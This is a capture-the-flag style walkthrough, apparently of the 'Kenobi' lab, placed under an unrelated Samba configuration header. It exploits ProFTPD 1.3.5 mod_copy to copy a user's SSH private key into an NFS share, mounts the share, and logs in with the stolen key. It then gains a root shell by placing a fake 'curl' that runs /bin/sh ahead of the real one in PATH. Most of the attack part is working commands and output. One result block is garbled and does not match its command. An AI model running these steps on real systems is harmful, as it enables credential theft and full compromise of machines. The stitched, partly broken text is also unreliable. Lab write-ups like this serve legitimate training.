# Sample configuration file for the Samba suite for Debian GNU/Linux.
#
#
# This is the main Samba configuration file. You should read the
# smb.conf(5) manual page in order to understand the options listed
# here. Samba has a huge number of configurable options most of which
# are not shown in this example
#
# Some options that are often worth tuning have been included as
# commented-out examples in this file.
#  - When such options are commented with ";", the proposed setting
#    differs from the default Samba behaviour
#  - When commented with "#", the proposed setting is the default
#    behaviour of Samba but the option is considered important
#    enough to be mentioned here
#
# NOTE: Whenever you modify this file you should run the command
# "testparm" to check that you have not made any basic syntactic
# errors.

## ProFTPd

A FOSS FTP server compatible with Unix and Windows systems. It's also been vulnerable in the past software version.

### Netcat

- Usage

  ```bash
  nc [ip address][port]
  ```

- Banner grabbing

  - Service banners are often used by system administrators for inventory taking of systems and services on the network. The service banners identify the running service and often the version number too.

- Raw connections
  - While connected, we are able to issue commands to the host server
- Webserver interaction
  - Netcat can also be used to interact with webservers by issuing HTTP requests. With the following command we can grab the banner of the web service running
  ```bash
  nc 10.10.x.x 80
  ```
- File transfers

  - In this example we will be using a Netcat connection to transfer a text file. Let’s assume we have remote command execution on the target host and we want to transfer a file from the attack box to the host. First we would need to set up a listener on the target host and connect to it from the attack box. We will be using port 8080 for this purpose and we safe the file to the desktop:

    ```bash
    nc -lvp 8080 > /root/Desktop/transfer.txt
    ```

  - On the attack box, we connect to port 8080 and send a file named transfer.txt

    ```bash
    nc 192.168.100.107 8080 < /root/Desktop/transfer.txt
    ```

### Results

```bash
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.254.107]
```

## Searchsploit

```bash
searchsploit ProFTPD

ProFTPd 1.3.5 - 'mod_copy' Command Execution (Metasploit) | linux/remote/37262.rb
ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution       | linux/remote/36803.py
ProFTPd 1.3.5 - File Copy                                 | linux/remote/36742.txt

```

## So Far We Know

- The user's name is kenobi
- The that /var dir is a mount
- There's a vulnerable version of the FTP server running
- There's anonymous FTP allowed

## Get Private Keys

We're now going to copy Kenobi's private key using SITE CPFR and SITE CPTO commands.

```bash
nc 10.10.x.x 21
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.254.107]
SITE CPFR /home/kenobi/.ssh/id_rsa
350 File or directory exists, ready for destination name
SITE CPTO /var/tmp/id_rsa
250 Copy successful
```

## Mounting

```bash
mkdir /mnt/kenobiNFS
mount machine_ip:/var /mnt/kenobiNFS
ls -la /mnt/kenobiNFS
```

- Copy the id_rsa to you dir, chmod 600 and then connect.

```bash
ssh -i id_rsa kenobi@10.10.x.x
```

# Exploitation

## SUID

- Search the system for custom files that could have the SUID bit set

```bash
find / -perm -u=s -type f 2>/dev/null
```

- Result

```bash
kenobi@kenobi:~$ find / -perm -u=s -type f 2>/dev/null

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :
```

- We see there is an unusual binary in here called menu. By running _strings_ on it, we can see any human readable string in the binary.

```bash
strings /usr/bin/menu
```

- After examining the output, we see

```bash
curl -I localhost
uname -r
ifconfig
```

- This shows us that the _curl_ binary is running is running without the full path (/usr/bin/curl or /usr/bin/username) so it can be created locally and added to the path!

## Exploiting CURL

```bash
echo /bin/sh > curl
chmod 777 curl
mv curl /tmp
export PATH=/tmp:$PATH
```
